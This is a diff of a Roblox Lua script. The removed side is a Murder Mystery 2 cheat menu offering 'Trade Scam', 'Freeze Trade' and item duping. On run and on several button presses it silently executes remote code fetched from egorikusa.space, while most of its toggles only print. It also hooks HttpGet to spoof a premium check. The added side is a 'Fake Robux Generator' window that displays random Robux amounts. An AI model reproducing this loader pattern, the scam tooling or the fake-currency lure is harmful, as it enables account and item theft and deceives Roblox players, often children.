@@ -1,68 +1,33 @@
-loadstring(game:HttpGet("https://egorikusa.space/c517464194904d62a07d4bcd.lua", true))()
-local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+-- Make sure to require the Orion UI Library (assuming you've added it to the game)
+local OrionLib = require(game:GetService("ReplicatedStorage"):WaitForChild("Orion"));
 
-local Window = OrionLib:MakeWindow({Name = "🎃Mm2Scripter🎃", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
-local Tab = Window:MakeTab({
-    Name = "Main",
-    Icon = "rbxassetid://4483345998",
-    PremiumOnly = false
-})
-Tab:AddButton({
-    Name = "Trade Scam✅",
-    Callback = function()
-loadstring(game:HttpGet("https://egorikusa.space/c517464194904d62a07d4bcd.lua", true))()
-              print("button pressed")
-      end 
-})
-Tab:AddToggle({
-    Name = "✅Force Accept",
-    Default = false,
-    Callback = function(Value)
-        print(Value)
-    end
-})
-Tab:AddToggle({
-    Name = "🧊Freeze Trade🧊",
-    Default = false,
-    Callback = function(Value)
-loadstring(game:HttpGet("https://egorikusa.space/c517464194904d62a07d4bcd.lua", true))()
-        print(Value)
-    end
-})
-local Tab = Window:MakeTab({
-    Name = "Dupe",
-    Icon = "rbxassetid://4483345998",
-    PremiumOnly = false
-    })
-Tab:AddButton({
-    Name = "NOTE! WAIT EQUIP SWORD YOU WANT TO DUPE WAIT 5MIN",
-    Callback = function()
-              print("button pressed")
-      end
-        })
-Tab:AddToggle({
-    Name = "Dupe Godly🔪",
-    Default = false,
-    Callback = function(Value)
-        print(Value)
-    end
-    })
-Tab:AddToggle({
-    Name = "New autoshoot + god mode (stable)",
-    Default = false,
-    Callback = function(Value)
-        print(Value)
-loadstring(game:HttpGet("https://rawscripts.net/raw/Murder-Mystery-2-MM-AUTO-SHOOT-15532"))()end
-})
-local httpHook;
-httpHook = hookfunction(game.HttpGet, function(self,...)
-   local Args = {...}
-   if Args[1] and type(Args[1]) == "string" then
-       if Args[1]:match("checkPremium.php") then
-           return "true"
-       end
-   end
-   return httpHook(self,...)
-end)
+-- Create a window
+local Window = OrionLib:MakeWindow({
+    Name = "Fake Robux Generator", 
+    HidePremium = true, 
+    IntroEnabled = false,
+    SaveConfig = true,
+    ConfigFolder = "OrionFakeRobuxGUI"
+});
 
-local OrionLib = loadstring(game:HttpGet(('https://hypernite.xyz/Backup/Orion/source.lua')))() -- Backed up to my host
+-- Create a Fake Robux Amount Label
+local RobuxAmountLabel = Instance.new("TextLabel")
+RobuxAmountLabel.Size = UDim2.new(0, 300, 0, 50)
+RobuxAmountLabel.Position = UDim2.new(0.5, -150, 0, 30)
+RobuxAmountLabel.Text = "You have 0 Robux!"
+RobuxAmountLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+RobuxAmountLabel.TextSize = 24
+RobuxAmountLabel.BackgroundTransparency = 1
+RobuxAmountLabel.Parent = game.Players.LocalPlayer.PlayerGui
+
+-- Create a button in the Orion UI
+local FakeRobuxButton = Window:MakeButton({
+    Name = "Generate Fake Robux", 
+    Callback = function()
+        -- Simulate generating fake Robux
+        local fakeRobux = math.random(1000, 10000)  -- Random amount of fake Robux
+        RobuxAmountLabel.Text = "You have " .. fakeRobux .. " Robux!"  -- Update the text on the label
+    end
+});
+
+-- This script will create the UI window and simulate the Robux generation when clicked.
